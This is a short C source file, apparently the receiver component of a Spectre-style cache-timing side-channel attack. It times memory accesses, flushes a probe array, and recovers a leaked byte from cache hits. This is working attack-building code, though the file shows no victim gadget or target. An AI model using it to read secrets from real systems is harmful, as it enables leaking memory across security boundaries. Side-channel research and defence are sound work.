#include "cache_timing.h"
#include <stdio.h>
#include <stdint.h>
#include <string.h>

uint64_t time_access(const void *addr) {
    volatile uint8_t *p = (volatile uint8_t *)addr;
    uint64_t t1 = rdtsc_begin();
    (void)*p;           /* access the memory */
    uint64_t t2 = rdtsc_end();
    return (t2 > t1) ? (t2 - t1) : 0;
}

void flush_probe_array(uint8_t *probe_array, size_t probe_size, int stride) {
    for (size_t i = 0; i < probe_size; i += (size_t)stride)
        cache_flush(&probe_array[i]);
    mfence();
}

int recover_byte(uint8_t *probe_array, int stride, uint64_t scores[256]) {
    int best = -1;
    uint64_t best_score = 0;

    for (int i = 0; i < 256; i++) {
        /* Mix up access order to avoid prefetcher effects */
        int idx = ((i * 167) + 13) & 255;
        uint64_t t = time_access(&probe_array[idx * stride]);

        /* Low time = cache hit = this byte was accessed speculatively */
        if (t < CACHE_HIT_THRESHOLD) {
            scores[idx]++;
        }

        if (scores[idx] > best_score) {
            best_score = scores[idx];
            best = idx;
        }
    }
    return best;
}
